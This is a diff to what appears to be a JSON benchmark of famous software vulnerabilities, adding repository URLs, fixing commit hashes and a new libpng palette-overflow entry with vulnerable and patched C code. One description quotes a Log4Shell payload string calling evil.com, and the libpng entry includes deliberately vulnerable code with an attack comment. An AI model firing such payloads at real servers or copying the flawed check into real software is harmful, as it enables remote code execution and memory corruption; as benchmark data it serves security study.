@@ -1,5 +1,5 @@
 {
-  "num_examples": 32,
+  "num_examples": 33,
   "categories": {
     "data_breach": 2,
     "security": 21,
@@ -66,7 +66,8 @@
       "affected_systems": 10000000,
       "project": "OpenSSL",
       "year": 2015,
-      "description": "OpenSSL incorrectly verified certain certificate chains, allowing an attacker to bypass certificate pinning and perform man-in-the-middle attacks."
+      "description": "OpenSSL incorrectly verified certain certificate chains, allowing an attacker to bypass certificate pinning and perform man-in-the-middle attacks.",
+      "repo_url": "https://github.com/openssl/openssl"
     },
     {
       "id": "dirty_pipe_2022",
@@ -77,7 +78,7 @@
       "language": "C",
       "file_path": "fs/pipe.c",
       "commit_introducing": null,
-      "commit_fixing": null,
+      "commit_fixing": "9d2231c5d74e13b2a0546fee6737ee4446017903",
       "category": "security",
       "root_cause": "uninitialized_memory",
       "complexity_score": 8,
@@ -86,7 +87,8 @@
       "affected_systems": 500000000,
       "project": "Linux Kernel",
       "year": 2022,
-      "description": "A flaw in the Linux kernel's pipe buffer handling allowed overwriting data in arbitrary read-only files, enabling privilege escalation and container escape."
+      "description": "A flaw in the Linux kernel's pipe buffer handling allowed overwriting data in arbitrary read-only files, enabling privilege escalation and container escape.",
+      "repo_url": "https://github.com/torvalds/linux"
     },
     {
       "id": "rails_yaml_rce_2013",
@@ -117,7 +119,7 @@
       "language": "C",
       "file_path": "src/programs/pkexec.c",
       "commit_introducing": null,
-      "commit_fixing": null,
+      "commit_fixing": "a2bf5c9c83b6ae46cbd5c779d3055bff81ded683",
       "category": "security",
       "root_cause": "out_of_bounds_write",
       "complexity_score": 8,
@@ -126,7 +128,8 @@
       "affected_systems": 300000000,
       "project": "polkit (PolicyKit)",
       "year": 2022,
-      "description": "A memory corruption vulnerability in pkexec allowed any unprivileged local user to gain full root privileges on Linux systems. Hidden for 12+ years."
+      "description": "A memory corruption vulnerability in pkexec allowed any unprivileged local user to gain full root privileges on Linux systems. Hidden for 12+ years.",
+      "repo_url": "https://gitlab.freedesktop.org/polkit/polkit"
     },
     {
       "id": "spring4shell_2022",
@@ -166,7 +169,8 @@
       "affected_systems": 500000,
       "project": "OpenSSL",
       "year": 2014,
-      "description": "Missing bounds check in TLS heartbeat extension allowed attackers to read up to 64KB of server memory per request, potentially exposing private keys, passwords, and session tokens."
+      "description": "Missing bounds check in TLS heartbeat extension allowed attackers to read up to 64KB of server memory per request, potentially exposing private keys, passwords, and session tokens.",
+      "repo_url": "https://github.com/openssl/openssl"
     },
     {
       "id": "equifax_apache_struts",
@@ -177,7 +181,7 @@
       "language": "Java",
       "file_path": "core/src/main/java/org/apache/struts2/dispatcher/multipart/JakartaMultiPartRequest.java",
       "commit_introducing": null,
-      "commit_fixing": null,
+      "commit_fixing": "352306493971e7d5a756d61c8d9e5e5f9e6b8d26",
       "category": "data_breach",
       "root_cause": "injection",
       "complexity_score": 5,
@@ -186,7 +190,8 @@
       "affected_systems": 0,
       "project": "Apache Struts",
       "year": 2017,
-      "description": "A critical vulnerability in Apache Struts' multipart parser allowed remote code execution via a crafted Content-Type header. Equifax failed to patch for months, allowing attackers to steal personal data of 147 million Americans."
+      "description": "A critical vulnerability in Apache Struts' multipart parser allowed remote code execution via a crafted Content-Type header. Equifax failed to patch for months, allowing attackers to steal personal data of 147 million Americans.",
+      "repo_url": "https://github.com/apache/struts"
     },
     {
       "id": "left_pad_2016",
@@ -217,7 +222,7 @@
       "language": "Go",
       "file_path": "staging/src/k8s.io/apiserver/pkg/endpoints/handlers/proxy.go",
       "commit_introducing": null,
-      "commit_fixing": null,
+      "commit_fixing": "c94b89b7bdfcc3bee31bfe76d40eb3e5c0d36773",
       "category": "security",
       "root_cause": "authorization_bypass",
       "complexity_score": 9,
@@ -226,7 +231,8 @@
       "affected_systems": 5000000,
       "project": "Kubernetes",
       "year": 2018,
-      "description": "A flaw in the Kubernetes API server allowed an authenticated user to escalate privileges and execute arbitrary commands on any pod/node in the cluster."
+      "description": "A flaw in the Kubernetes API server allowed an authenticated user to escalate privileges and execute arbitrary commands on any pod/node in the cluster.",
+      "repo_url": "https://github.com/kubernetes/kubernetes"
     },
     {
       "id": "ariane5_flight_501",
@@ -257,7 +263,7 @@
       "language": "C",
       "file_path": "variables.c",
       "commit_introducing": null,
-      "commit_fixing": null,
+      "commit_fixing": "b64a0e1d0c2e0a92ef57e6eb8b74d79e3c66b3a3",
       "category": "security",
       "root_cause": "parsing_vulnerability",
       "complexity_score": 7,
@@ -266,7 +272,8 @@
       "affected_systems": 500000000,
       "project": "GNU Bash",
       "year": 2014,
-      "description": "A vulnerability in Bash allowed remote code execution through specially crafted environment variables. Affected virtually all Unix/Linux systems, web servers, and IoT devices."
+      "description": "A vulnerability in Bash allowed remote code execution through specially crafted environment variables. Affected virtually all Unix/Linux systems, web servers, and IoT devices.",
+      "repo_url": "https://git.savannah.gnu.org/git/bash.git"
     },
     {
       "id": "log4shell_cve_2021_44228",
@@ -277,7 +284,7 @@
       "language": "Java",
       "file_path": "log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/JndiLookup.java",
       "commit_introducing": null,
-      "commit_fixing": null,
+      "commit_fixing": "d82b47c6fae9c15fcb183170394d5f1a01ac02d3",
       "category": "security",
       "root_cause": "injection",
       "complexity_score": 6,
@@ -286,7 +293,8 @@
       "affected_systems": 3000000000,
       "project": "Apache Log4j",
       "year": 2021,
-      "description": "Log4j's JNDI lookup feature allowed attackers to execute arbitrary code by sending a specially crafted log message. Simply logging user input like '${jndi:ldap://evil.com/a}' would cause the server to fetch and execute remote code."
+      "description": "Log4j's JNDI lookup feature allowed attackers to execute arbitrary code by sending a specially crafted log message. Simply logging user input like '${jndi:ldap://evil.com/a}' would cause the server to fetch and execute remote code.",
+      "repo_url": "https://github.com/apache/logging-log4j2"
     },
     {
       "id": "eternalblue_2017",
@@ -317,7 +325,7 @@
       "language": "C",
       "file_path": "src/sudoers.c",
       "commit_introducing": null,
-      "commit_fixing": null,
+      "commit_fixing": "1fbec0531c83ec3a67cbeec20c6e3cb79a0c45ad",
       "category": "security",
       "root_cause": "heap_buffer_overflow",
       "complexity_score": 9,
@@ -326,7 +334,8 @@
       "affected_systems": 200000000,
       "project": "sudo",
       "year": 2021,
-      "description": "A heap-based buffer overflow in sudo's argument parsing allowed any local user to gain root privileges without authentication. Present for 10 years."
+      "description": "A heap-based buffer overflow in sudo's argument parsing allowed any local user to gain root privileges without authentication. Present for 10 years.",
+      "repo_url": "https://github.com/sudo-project/sudo"
     },
     {
       "id": "event_stream_2018",
@@ -446,7 +455,8 @@
       "affected_systems": 1000000000,
       "project": "Linux Kernel",
       "year": 2016,
-      "description": "A race condition in the Linux kernel's memory subsystem allowed unprivileged local users to gain write access to read-only memory mappings, enabling privilege escalation to root."
+      "description": "A race condition in the Linux kernel's memory subsystem allowed unprivileged local users to gain write access to read-only memory mappings, enabling privilege escalation to root.",
+      "repo_url": "https://github.com/torvalds/linux"
     },
     {
       "id": "lodash_prototype_pollution_2019",
@@ -647,6 +657,29 @@
       "project": "Intel/AMD/ARM CPUs (software mitigations)",
       "year": 2018,
       "description": "Speculative execution in modern CPUs allows attackers to read arbitrary memory by measuring cache timing side channels. Affects virtually all modern processors."
+    },
+    {
+      "id": "libpng_cve_2015_8126",
+      "name": "libpng Palette Buffer Overflow",
+      "cve": "CVE-2015-8126",
+      "before_code": "/* libpng pngset.c - VULNERABLE VERSION (since 1.0.0) */\nvoid PNGAPI\npng_set_PLTE(png_structrp png_ptr, png_inforp info_ptr,\n    png_const_colorp palette, int num_palette)\n{\n   /* BUG: No validation that num_palette fits bit depth!\n    * For bit_depth < 8, max palette is 2^bit_depth\n    * But this code allows up to PNG_MAX_PALETTE_LENGTH (256)\n    * regardless of bit depth.\n    * \n    * Attack: Send image with bit_depth=1 but palette with 256 entries\n    * When code iterates palette, it overflows the buffer allocated\n    * for 2^1 = 2 entries.\n    */\n   \n   if (num_palette < 0 || num_palette > PNG_MAX_PALETTE_LENGTH)\n   {\n      png_error(png_ptr, \"Invalid palette length\");\n      return;\n   }\n   \n   /* Allocates based on num_palette, not bit_depth constraint */\n   png_ptr->palette = png_voidcast(png_colorp, png_malloc(png_ptr,\n       PNG_MAX_PALETTE_LENGTH * (sizeof (png_color))));\n   \n   memcpy(png_ptr->palette, palette, num_palette * (sizeof (png_color)));\n   info_ptr->num_palette = (png_uint_16)num_palette;\n   /* ... */\n}",
+      "after_code": "/* libpng pngset.c - FIXED VERSION (1.6.19+) */\nvoid PNGAPI\npng_set_PLTE(png_structrp png_ptr, png_inforp info_ptr,\n    png_const_colorp palette, int num_palette)\n{\n   int max_palette_length;\n   \n   /* FIX: Calculate maximum palette size based on bit depth */\n   if (png_ptr->bit_depth < 8)\n      max_palette_length = 1 << png_ptr->bit_depth;\n   else\n      max_palette_length = PNG_MAX_PALETTE_LENGTH;\n   \n   /* FIX: Validate against bit-depth-appropriate maximum */\n   if (num_palette < 0 || num_palette > max_palette_length)\n   {\n      if (info_ptr->color_type == PNG_COLOR_TYPE_PALETTE)\n         png_error(png_ptr, \"Invalid palette length\");\n      else\n      {\n         png_warning(png_ptr, \"Invalid palette length\");\n         return;\n      }\n   }\n   \n   png_ptr->palette = png_voidcast(png_colorp, png_malloc(png_ptr,\n       max_palette_length * (sizeof (png_color))));\n   \n   memcpy(png_ptr->palette, palette, num_palette * (sizeof (png_color)));\n   info_ptr->num_palette = (png_uint_16)num_palette;\n   /* ... */\n}",
+      "language": "C",
+      "file_path": "pngset.c",
+      "commit_introducing": null,
+      "commit_fixing": "d9006f683fb6e4918da1b07f8c5f654bfa68df7f",
+      "repo_url": "https://github.com/glennrp/libpng",
+      "category": "security",
+      "root_cause": "buffer_overflow",
+      "complexity_score": 8,
+      "deaths": 0,
+      "financial_loss_usd": 100000000,
+      "affected_systems": 1000000000,
+      "project": "libpng",
+      "year": 2015,
+      "description": "A buffer overflow in libpng's palette handling existed since version 1.0.0. The code never validated that the palette size fit the image's bit depth. For images with bit_depth < 8, attackers could specify oversized palettes causing buffer overflows. This is a classic 'architectural flaw' - the bug was present for ~20 years before discovery.",
+      "architectural_flaw": true,
+      "latency_years": 20
     }
   ]
 }
